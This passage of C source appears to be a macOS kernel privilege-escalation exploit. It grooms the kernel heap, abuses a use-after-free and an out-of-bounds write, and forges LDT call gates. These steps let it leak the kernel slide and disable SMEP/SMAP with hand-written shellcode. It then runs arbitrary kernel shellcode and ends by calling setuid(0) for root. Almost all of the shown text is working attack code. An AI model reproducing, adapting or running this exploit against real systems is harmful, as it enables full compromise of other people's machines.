            case ACC_P:
                BAD_DESC(dp, "ACC_P in ldt will be zeroed out");
			case ACC_P | ACC_PL_U | ACC_DATA:
			case ACC_P | ACC_PL_U | ACC_DATA_W:
			case ACC_P | ACC_PL_U | ACC_DATA_E:
			case ACC_P | ACC_PL_U | ACC_DATA_EW:
			case ACC_P | ACC_PL_U | ACC_CODE:
			case ACC_P | ACC_PL_U | ACC_CODE_R:
			case ACC_P | ACC_PL_U | ACC_CODE_C:
			case ACC_P | ACC_PL_U | ACC_CODE_CR:
                break;
            default:
                BAD_DESC(dp, "bad dp->access 0x%x", dp->access);
        }
        if (dp->granularity & SZ_64)
            BAD_DESC(dp, "SZ_64 granularity: 0x%x", dp->granularity);
    }
}

void wait_for_cpu0() {
    unsigned long gdt0 = get_idt()-0xc000+0x83000;
    while (get_gdt() != gdt0)
        sched_yield();
}

void* exc_handler_func(void* arg) {
    kern_return_t err;
    mach_port_t exc_port = *(mach_port_t*)arg;
    __Request__mach_exception_raise_state_t req = {0};
    __Reply__mach_exception_raise_state_t reply = {0};

    req.Head.msgh_size = sizeof(req);
    err = mach_msg(&req.Head, MACH_RCV_MSG, 0, req.Head.msgh_size, exc_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    if (err != KERN_SUCCESS)
        die("exc handler couldnt receive message: 0x%x\n", err);
    printf("exc 0x%x code[0] 0x%llx code[1] 0x%llx\n", req.exception, req.code[0], req.code[1]);
    x86_thread_full_state64_t* state = (void*)&req.old_state;
    printf("ss: 0x%016llx\n", state->__ss);
    printf("r15: 0x%016llx\n", state->__ss64.__r15);

    reply.Head.msgh_bits = MACH_MSGH_BITS(MACH_MSGH_BITS_REMOTE(req.Head.msgh_bits), 0);
    reply.Head.msgh_size = sizeof(reply)-sizeof(reply.new_state) + req.old_stateCnt*4;
    reply.Head.msgh_remote_port = req.Head.msgh_remote_port;
    reply.Head.msgh_id = req.Head.msgh_id + 100;
    reply.NDR = req.NDR;
    reply.RetCode = KERN_SUCCESS;
    reply.flavor = req.flavor;
    reply.new_stateCnt = req.old_stateCnt;

    x86_thread_full_state64_t* nstate = (void*)&reply.new_state;
    memcpy(nstate, state, req.old_stateCnt*4);
    int ss = 0;
    asm volatile("mov %%ss, %0" : "=r" (ss) : : );
    nstate->__ss = ss;
    printf("new ss: 0x%x\n", ss);

    err = mach_msg(&reply.Head, MACH_SEND_MSG, reply.Head.msgh_size, 0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    if (err != KERN_SUCCESS)
        die("couldnt send exc reply: 0x%x\n", err);

    return 0;
}

void disable_smep_smap() {
    kern_return_t err;

    mach_port_t exc_port;
    err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &exc_port);
    if (err != KERN_SUCCESS)
        die("couldnt create exc port: 0x%x\n", err);
    err = mach_port_insert_right(mach_task_self(), exc_port, exc_port, MACH_MSG_TYPE_MAKE_SEND);
    if (err != KERN_SUCCESS)
        die("couldnt insert send right to exc port: 0x%x\n", err);
    pthread_t exc_handler;
    if (pthread_create(&exc_handler, 0, exc_handler_func, &exc_port))
        die("couldnt create exc handler thread\n");
    pthread_detach(exc_handler);
    err = thread_set_exception_ports(mach_thread_self(), EXC_MASK_BAD_ACCESS, exc_port, EXCEPTION_STATE|MACH_EXCEPTION_CODES, x86_THREAD_FULL_STATE64);
    if (err != KERN_SUCCESS)
        die("couldnt set exc ports: 0x%x\n", err);

    alloc_osarray(0x8000000-8, CSTR("pad0"), 1); // 128M
    alloc_osarray(0x8000000-8, CSTR("pad1"), 1);
    alloc_osarray(0x8000000-8, CSTR("pad2"), 1);
    alloc_osarray(0x4000000, CSTR("pad3"), 1);
    alloc_osarray(0x4800000, CSTR("pad4"), 1);
    alloc_osarray(0x2000000, CSTR("pwn"), 96); // overlaps uaf_dbuf

    struct hibernate_bitmap_t {
        uint32_t first_page;
        uint32_t last_page;
        uint32_t bitmapwords;
        uint32_t bitmap[0];
    };
    struct hibernate_page_list_t {
        uint32_t list_size;
        uint32_t page_count;
        uint32_t bank_count;
        struct hibernate_bitmap_t bank_bitmap[0];
    };

    // create misaligned fake object (so kernel pointers meet valid ldt constraints)
    unsigned long desc[12] = {0};
    unsigned long fakeaddr = get_idt()-0xc000+0x87000 + 8*3 + 6;
    unsigned long* fake = (void*)desc+6;
    struct hibernate_page_list_t* list = (void*)fake;
    fake[0] = fakeaddr; // vtable
    list->bank_count = 1;
    list->bank_bitmap[0].last_page = 0xffffffff & ~0x20; // SZ_64 bit
    // vtable->taggedRetain
    // subtract 10 to avoid SZ_64 bit, theres an alignment nop before the func
    fake[0x48/8] = find_dblmap_sym(CSTR("hibernate_page_bitset"))-10;
    fake[0x50/8] = get_idt()-0xc000 + 0x1059; // vtable->taggedRelease, ret gadget

    // setup most of the call gate except "access" byte
    unsigned long callgate_target = get_idt()-0xc000 + 0x2862;
    int sz64 = (callgate_target>>21)&1; // cant have 64-bit granularity
    if (sz64)
        callgate_target &= ~(1ul<<21);
    desc[4] |= callgate_target&0xffff; // offset 15:00
    desc[4] |= 8<<16; // segment selector
    desc[4] |= ((callgate_target>>16)&0xffff) << 48; // offset 31:16
    desc[5] |= callgate_target>>32; // offset 63:32

    if (i386_set_ldt(3, (void*)desc, sizeof(desc)/8) < 0)
        die("couldnt set ldt\n");

    // bitmap at fake+0x18
    // callgate at bitmap+2, bit 16

    // vtable func called with rdx == array idx + 1
#define SETBIT(_b) do { \
    unsigned int b = (_b)+16; \
    b = (b&~31) | (31 - (b&31)); \
    uaf_write64((b-1)*8, fakeaddr); \
} while(0)

    // set present
    SETBIT(47);
    // set desc type to call gate
    SETBIT(42);
    SETBIT(43);
    // set DPL to 3
    SETBIT(45);
    SETBIT(46);
    if (sz64)
        SETBIT(53);
    uaf_write64(95*8, 0);

    // must stay on cpu 0 through bitsets and far call
    unsigned long read_target = get_idt()-0xc000 + 0xb000 - 0x48; // read ks_dispatch from idt64_hndl_table0
    unsigned long leak;
    int fcallp[2] = {0, 0x3f};
    wait_for_cpu0();
    get_surface_val(CSTR("pwn"));
    asm volatile("mov %%rsp, %%rax; pushfq; pop %%rsp; mov %1, %%r15; lcalll *(%2); mov %%rax, %%rsp; mov %%r15, %0" : "=r" (leak) : "r" (read_target), "r" (&fcallp) : "r15", "rax");

    printf("leak: 0x%lx\n", leak);
    kernel_slide = leak - find_sym(CSTR("ks_dispatch"));
    printf("kernel_slide: 0x%lx\n", kernel_slide);
    if (kernel_slide & 0xfff)
        die("bad kernel slide\n");

    unsigned long ncallgate_target = get_idt()-0xc000 + 0x47; // mov cr3, rax ; next insn +0x4a
    int nsz64 = (ncallgate_target>>21)&1; // cant have 64-bit granularity
    if (nsz64)
        ncallgate_target &= ~(1ul<<21);
    desc[4] = desc[5] = 0;
    desc[4] |= ncallgate_target&0xffff; // offset 15:00
    desc[4] |= 8<<16; // segment selector
    desc[4] |= ((ncallgate_target>>16)&0xffff) << 48; // offset 31:16
    desc[5] |= ncallgate_target>>32; // offset 63:32

    if (i386_set_ldt(3, (void*)desc, sizeof(desc)/8) < 0)
        die("couldnt set ldt\n");

    if (sz64 != nsz64) {
        if (nsz64)
            SETBIT(53);
        else {
            unsigned long fakeaddr = 0;
            SETBIT(53);
        }
    }

#define PML4I(x) (((x)>>39)&0x1ff)
#define PDPTI(x) (((x)>>30)&0x1ff)
#define PDI(x) (((x)>>21)&0x1ff)
#define PTI(x) (((x)>>12)&0x1ff)
#define MAP(_v, p) do { \
    unsigned long v = _v; \
    pml4_desc[PML4I(v)] = pdpt_phys | 3; \
    pdpt_desc[PDPTI(v)] = pd_phys | 3; \
    pd_desc[PDI(v)] = pt_phys | 3; \
    pt_desc[PTI(v)] = ((p)&~0xfff) | 3; \
} while (0)
    unsigned long ldt_phys = 0x187000 + kernel_slide;
    unsigned long sc_phys = ldt_phys + 0x1000;
    unsigned long pml4_phys = sc_phys + 0x1000;
    unsigned long pdpt_phys = pml4_phys + 0x1000;
    unsigned long pd_phys = pdpt_phys + 0x1000;
    unsigned long pt_phys = pd_phys + 0x1000;
    unsigned long insn = ncallgate_target + 3;
    unsigned long ucr3 = get_idt()-0xc000 + 0xd138;
    unsigned long ucr3_phys = 0x10d138 + kernel_slide;
    unsigned long ureturn = get_idt()-0xc000 + 0x288e; // where ks_64bit_return does cr3 switch
    unsigned long ureturn_phys = 0x10288e + kernel_slide;

    unsigned long pml4_desc[512] = {0};
    unsigned long pdpt_desc[512] = {0};
    unsigned long pd_desc[512] = {0};
    unsigned long pt_desc[512] = {0};
    MAP(insn, sc_phys);
    MAP(ucr3, ucr3_phys);
    MAP(ureturn, ureturn_phys);
    MAP(get_idt()-0xc000+0x85000, 0x185000+kernel_slide); // master_sstk
    MAP(get_idt()-0xc000+0x83000, 0x183000+kernel_slide); // master_gdt
    if (i386_set_ldt(512*2, (void*)pml4_desc, sizeof(pml4_desc)/8) < 0)
        die("couldnt set pml4 ldt\n");
    if (i386_set_ldt(512*3, (void*)pdpt_desc, sizeof(pdpt_desc)/8) < 0)
        die("couldnt set pdpt ldt\n");
    if (i386_set_ldt(512*4, (void*)pd_desc, sizeof(pd_desc)/8) < 0)
        die("couldnt set pd ldt\n");
    if (i386_set_ldt(512*5, (void*)pt_desc, sizeof(pt_desc)/8) < 0)
        die("couldnt set pt ldt\n");

    // we have chunks of 6 arb bytes, then 2 bytes with access/granularity
    // so 4 bytes arb shellcode, then 2 bytes short jmp
    //   mov rax, cr4
    //   and rax, rbx
    //   mov cr4, rax
    //   mov rax, [rcx]
    //   pop rbx
    //   pop rcx
    //   pushfq
    //   push rcx
    //   push rbx
    //   swapgs
    //   xor ebx, ebx
    //   push rbx
    //   push rbx
    //   jmp rdx
    static GLOB int sc[] = {0x90e0200f, 0x02eb, 0x90d82148, 0x02eb, 0x90e0220f, 0x02eb, 0x90018b48, 0x02eb, 0x519c595b, 0x02eb, 0xf8010f53, 0x02eb, 0x5353db31, 0xe2ff};
    unsigned long sc_desc[512] = {0};
    *(int*)((void*)&sc_desc + (insn&0xfff)) = 0x02eb90;
    memcpy((void*)&sc_desc + (insn&0xfff) + 5, sc, sizeof(sc));
    if (i386_set_ldt(512, (void*)sc_desc, sizeof(sc_desc)/8) < 0)
        die("couldnt set sc ldt\n");

    wait_for_cpu0();
    get_surface_val(CSTR("pwn"));
    asm volatile("mov %0, %%rax; mov %1, %%rbx; mov %2, %%rcx; mov %3, %%rdx; lcalll *(%4)" : : "r" (pml4_phys), "r" (~((1ul<<20)|(1ul<<21))), "r" (ucr3), "r" (ureturn), "r" (&fcallp) : "rax", "rbx", "rcx", "rdx");
    printf("SMEP/SMAP disabled\n");
}

void code_exec(void* sc, unsigned long sc_len) {
    // setup imports
    struct kimports kimports = {0};
#define KIMP_RESOLVE(typ, name, ...) kimports.val64_##name = find_sym(CSTR(#name));
    FOR_EACH_KIMP(KIMP_RESOLVE);
#undef KIMP_RESOLVE

    void* rwx = mmap(0, sc_len, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS|MAP_JIT, -1, 0);
    if (rwx == MAP_FAILED)
        die("couldnt map rwx shellcode\n");
    memcpy(rwx, sc, sc_len);

    unsigned long fake[0x58/8] = {0};
    fake[0] = (unsigned long)&fake;
    fake[1] = (unsigned long)&kimports;
    fake[0x48/8] = (unsigned long)rwx;
    fake[0x50/8] = get_idt()-0xc000+0x1059; // taggedRelease, ret gadget
    uaf_write64(0, (unsigned long)&fake);
    // only cpu 0 has smep/smap disabled
    wait_for_cpu0();
    get_surface_val(CSTR("pwn"));

    munmap(rwx, sc_len);
}

void cleanup() {
    uaf_write64(0, 0); // null fake OSArray entry
    delete_surface(surf_id);
    IOServiceClose(sroot_svc);
    IOServiceClose(vidctx_main);
    IOServiceClose(vidctx_main2);
    IOServiceClose(shared_client);
    IOServiceClose(cmdq);
    IONotificationPortDestroy(notifi_ref);
    IOObjectRelease(accel_svc);
    IOObjectRelease(sroot_svc);
    munmap(bigmem, 0x800000000);
    munmap(kfile, kfile_sz);
}

void exploit() {
    parse_kernel_macho();
    iosurface_setup();
    vidctx_setup();
    cmdq_setup();

    fill_bigmem();
    fill_kernel_map(); // fill footprint-sized holes in kernel map, leaving holes for smaller allocations
    alloc_dbuf0();
    alloc_corpse(); // alloc footprint after oob buffer
    alloc_uaf_dbuf(); // alloc iokit pageable map after footprint with just uaf_dbuf
    oob_write32(0x800000 + 0x20000000); // footprint consumes iokit map
    mach_port_destroy(mach_task_self(), corpse); // free enlarged footprint

    disable_smep_smap();

    free_kernel_map_fillers();
    code_exec(kernel_sc_bin, sizeof(kernel_sc_bin));
    setuid(0);

    cleanup();
}
